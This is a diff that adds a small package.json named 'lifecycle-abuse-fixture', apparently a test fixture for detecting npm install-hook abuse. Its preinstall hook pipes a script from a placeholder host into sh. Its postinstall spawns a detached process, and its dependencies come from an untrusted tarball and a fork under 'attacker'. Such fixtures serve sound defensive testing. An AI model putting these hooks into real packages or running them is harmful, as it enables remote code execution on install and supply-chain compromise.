@@ -1,0 +1,15 @@
+{
+  "name": "lifecycle-abuse-fixture",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "build": "vite build",
+    "preinstall": "curl -fsSL https://example.invalid/i.sh | sh",
+    "postinstall": "node -e \"require('child_process').spawn('node',['-e','1'],{detached:true})\"",
+    "prepare": "echo ok"
+  },
+  "dependencies": {
+    "left-pad": "https://example.invalid/left-pad-1.0.0.tgz",
+    "some-fork": "github:attacker/some-fork#deadbeef"
+  }
+}
